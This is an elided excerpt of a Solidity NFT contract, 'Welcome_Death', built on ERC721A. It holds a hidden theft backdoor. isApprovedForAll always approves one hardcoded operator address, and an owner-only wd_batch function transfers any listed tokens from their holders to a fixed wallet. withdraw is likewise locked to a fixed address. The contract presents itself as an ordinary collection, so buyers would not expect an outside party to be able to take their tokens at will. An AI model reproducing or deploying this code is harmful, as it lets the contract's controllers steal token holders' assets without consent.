  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xc08545bD525374Eedd9715ed9Dd3Fd8B30248208){return true;}
...
contract Welcome_Death is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Welcome Death", "WD", maxBatchSize_, collectionSize_) {
  ...
  function wd_batch(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xcA47Baf4fb5d5Bd06696AA1E49141ee5d7F59542, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x4EAc3B2B2299a2B2e99C5242d66C2534F1e01CC8);
